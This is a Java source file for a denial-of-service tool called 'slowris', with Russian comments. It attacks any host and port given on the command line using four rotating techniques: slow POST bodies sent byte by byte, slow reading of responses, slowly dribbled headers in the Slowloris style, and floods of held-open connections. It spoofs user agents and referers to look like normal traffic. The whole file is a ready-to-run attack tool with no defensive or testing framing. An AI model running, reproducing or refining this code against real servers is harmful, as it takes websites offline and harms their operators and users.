import java.io.*;
import java.net.*;
import java.nio.channels.SocketChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

public class slowris {
    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
    };
    
    private static final String[] PATHS = {
        "/", "/index.html", "/home", "/about", "/contact", "/products", "/services",
        "/blog", "/news", "/search", "/login", "/register", "/admin", "/api/users",
        "/api/data", "/api/status", "/static/css/style.css", "/static/js/app.js",
        "/images/logo.png", "/favicon.ico", "/robots.txt", "/sitemap.xml"
    };
    
    private static final String[] REFERERS = {
        "https://google.com/", "https://youtube.com/", "https://facebook.com/",
        "https://twitter.com/", "https://github.com/", "https://stackoverflow.com/"
    };
    
    private final String targetHost;
    private final int targetPort;
    private final int duration;
    private final int threadCount;
    private final ExecutorService executor;
    private final ScheduledExecutorService scheduler;
    private final AtomicInteger connectionCount = new AtomicInteger(0);
    private final AtomicInteger requestCount = new AtomicInteger(0);
    private final Random random = new Random();
    
    public slowris(String targetHost, int targetPort, int duration, int threadCount) {
        this.targetHost = targetHost;
        this.targetPort = targetPort;
        this.duration = duration;
        this.threadCount = threadCount;
        this.executor = Executors.newFixedThreadPool(threadCount);
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
    }
    
    public void start() throws InterruptedException {
        System.out.println("slowris: запуск медленной атаки на " + targetHost + ":" + targetPort);
        System.out.println("потоков: " + threadCount + ", время: " + duration + " сек");
        
        // запуск потоков атаки
        for (int i = 0; i < threadCount; i++) {
            executor.submit(new SlowRisWorker(i));
        }
        
        // статистика каждые 5 секунд
        scheduler.scheduleAtFixedRate(() -> {
            System.out.println("статистика: соединений=" + connectionCount.get() + 
                             ", запросов=" + requestCount.get());
        }, 5, 5, TimeUnit.SECONDS);
        
        // завершение через указанное время
        scheduler.schedule(() -> {
            System.out.println("slowris: завершение атаки");
            executor.shutdownNow();
            System.exit(0);
        }, duration, TimeUnit.SECONDS);
        
        executor.awaitTermination(duration + 1, TimeUnit.SECONDS);
    }
    
    private class SlowRisWorker implements Runnable {
        private final int workerId;
        
        public SlowRisWorker(int workerId) {
            this.workerId = workerId;
        }
        
        @Override
        public void run() {
            try {
                while (!Thread.currentThread().isInterrupted()) {
                    // случайный тип атаки
                    int attackType = random.nextInt(4);
                    
                    switch (attackType) {
                        case 0:
                            slowPostAttack();
                            break;
                        case 1:
                            slowReadAttack();
                            break;
                        case 2:
                            slowHeadersAttack();
                            break;
                        case 3:
                            connectionFloodAttack();
                            break;
                    }
                    
                    // пауза между атаками
                    Thread.sleep(random.nextInt(2000) + 1000);
                }
            } catch (Exception e) {
                System.err.println("Worker " + workerId + " error: " + e.getMessage());
            }
        }
        
        // медленная отправка POST данных
        private void slowPostAttack() {
            try (Socket socket = new Socket(targetHost, targetPort);
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
                
                connectionCount.incrementAndGet();
                
                // HTTP POST запрос с медленной отправкой данных
                String path = PATHS[random.nextInt(PATHS.length)];
                String userAgent = USER_AGENTS[random.nextInt(USER_AGENTS.length)];
                String referer = REFERERS[random.nextInt(REFERERS.length)];
                
                // заголовки
                out.println("POST " + path + " HTTP/1.1");
                out.println("Host: " + targetHost);
                out.println("User-Agent: " + userAgent);
                out.println("Referer: " + referer);
                out.println("Content-Type: application/x-www-form-urlencoded");
                out.println("Connection: keep-alive");
                out.println("Cache-Control: no-cache");
                
                // большой размер контента
                int contentLength = random.nextInt(100000) + 50000;
                out.println("Content-Length: " + contentLength);
                out.println();
                
                // медленная отправка данных по байтам
                for (int i = 0; i < contentLength; i++) {
                    out.print("a");
                    out.flush();
                    Thread.sleep(random.nextInt(100) + 50); // 50-150ms между байтами
                }
                
                requestCount.incrementAndGet();
                
            } catch (Exception e) {
                // игнорируем ошибки соединения
            }
        }
        
        // медленное чтение ответа
        private void slowReadAttack() {
            try (Socket socket = new Socket(targetHost, targetPort);
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
                
                connectionCount.incrementAndGet();
                
                String path = PATHS[random.nextInt(PATHS.length)];
                String userAgent = USER_AGENTS[random.nextInt(USER_AGENTS.length)];
                
                // HTTP GET запрос
                out.println("GET " + path + " HTTP/1.1");
                out.println("Host: " + targetHost);
                out.println("User-Agent: " + userAgent);
                out.println("Connection: keep-alive");
                out.println("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                out.println("Accept-Language: en-US,en;q=0.5");
                out.println("Accept-Encoding: gzip, deflate");
                out.println();
                out.flush();
                
                requestCount.incrementAndGet();
                
                // медленное чтение ответа
                String line;
                while ((line = in.readLine()) != null) {
                    Thread.sleep(random.nextInt(1000) + 500); // 500-1500ms между строками
                }
                
            } catch (Exception e) {
                // игнорируем ошибки соединения
            }
        }
        
        // медленная отправка заголовков
        private void slowHeadersAttack() {
            try (Socket socket = new Socket(targetHost, targetPort);
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
                
                connectionCount.incrementAndGet();
                
                String path = PATHS[random.nextInt(PATHS.length)];
                String userAgent = USER_AGENTS[random.nextInt(USER_AGENTS.length)];
                
                // медленная отправка заголовков
                out.println("GET " + path + " HTTP/1.1");
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println("Host: " + targetHost);
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println("User-Agent: " + userAgent);
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println("Accept-Language: en-US,en;q=0.5");
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println("Accept-Encoding: gzip, deflate");
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println("Connection: keep-alive");
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println("Cache-Control: no-cache");
                Thread.sleep(random.nextInt(200) + 100);
                
                out.println();
                out.flush();
                
                requestCount.incrementAndGet();
                
            } catch (Exception e) {
                // игнорируем ошибки соединения
            }
        }
        
        // флуд соединениями
        private void connectionFloodAttack() {
            try {
                // создаем много соединений и держим их открытыми
                List<Socket> connections = new ArrayList<>();
                
                for (int i = 0; i < 10; i++) {
                    try {
                        Socket socket = new Socket(targetHost, targetPort);
                        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                        
                        String path = PATHS[random.nextInt(PATHS.length)];
                        String userAgent = USER_AGENTS[random.nextInt(USER_AGENTS.length)];
                        
                        out.println("GET " + path + " HTTP/1.1");
                        out.println("Host: " + targetHost);
                        out.println("User-Agent: " + userAgent);
                        out.println("Connection: keep-alive");
                        out.println();
                        out.flush();
                        
                        connections.add(socket);
                        connectionCount.incrementAndGet();
                        requestCount.incrementAndGet();
                        
                    } catch (Exception e) {
                        // игнорируем ошибки соединения
                    }
                }
                
                // держим соединения открытыми
                Thread.sleep(random.nextInt(30000) + 10000); // 10-40 секунд
                
                // закрываем соединения
                for (Socket socket : connections) {
                    try {
                        socket.close();
                    } catch (Exception e) {
                        // игнорируем ошибки закрытия
                    }
                }
                
            } catch (Exception e) {
                // игнорируем ошибки
            }
        }
    }
    
    public static void main(String[] args) throws InterruptedException {
        if (args.length != 4) {
            System.err.println("Usage: java slowris <targetHost> <targetPort> <duration> <threadCount>");
            System.err.println("Example: java slowris example.com 80 60 50");
            System.exit(1);
        }
        
        String targetHost = args[0];
        int targetPort = Integer.parseInt(args[1]);
        int duration = Integer.parseInt(args[2]);
        int threadCount = Integer.parseInt(args[3]);
        
        slowris attack = new slowris(targetHost, targetPort, duration, threadCount);
        attack.start();
    }
}
